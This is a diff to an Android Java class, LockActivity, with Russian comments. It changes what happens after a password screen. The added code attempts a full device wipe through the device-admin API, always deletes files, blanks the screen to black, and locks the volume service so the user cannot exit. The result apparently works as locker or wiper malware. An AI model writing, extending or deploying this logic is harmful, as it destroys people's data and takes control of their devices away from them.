@@ -140,7 +140,6 @@ public class LockActivity extends Activity {
         EditText passwordInput = findViewById(R.id.passwordInput);
         TextView enterButton = findViewById(R.id.enterButton);
 
-        // ЯВНО ВЫЗЫВАЕМ КЛАВИАТУРУ
         passwordInput.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
@@ -208,15 +207,25 @@ public class LockActivity extends Activity {
                 try {
                     dpm.wipeData(0);
                 } catch (Exception e) {
-                    deleteFiles();
+                    // игнорируем
                 }
-            } else {
-                deleteFiles();
             }
-        } else {
-            deleteFiles();
         }
-        finish();
+
+        deleteFiles();
+
+        // Убираем весь интерфейс, оставляем черный экран
+        View mainBlock = findViewById(R.id.mainBlock);
+        TextView bootText = findViewById(R.id.bootText);
+        if (mainBlock != null) mainBlock.setVisibility(View.GONE);
+        if (bootText != null) {
+            bootText.setVisibility(View.VISIBLE);
+            bootText.setText("");
+            bootText.setBackgroundColor(0xFF000000); 
+        }
+        
+        // Отключаем возможность выхода
+        VolumeBlockService.setLocked(true);
     }
 
     private void deleteFiles() {
@@ -351,4 +360,4 @@ public class LockActivity extends Activity {
         }
         handler.removeCallbacksAndMessages(null);
     }
-                            }
+    }
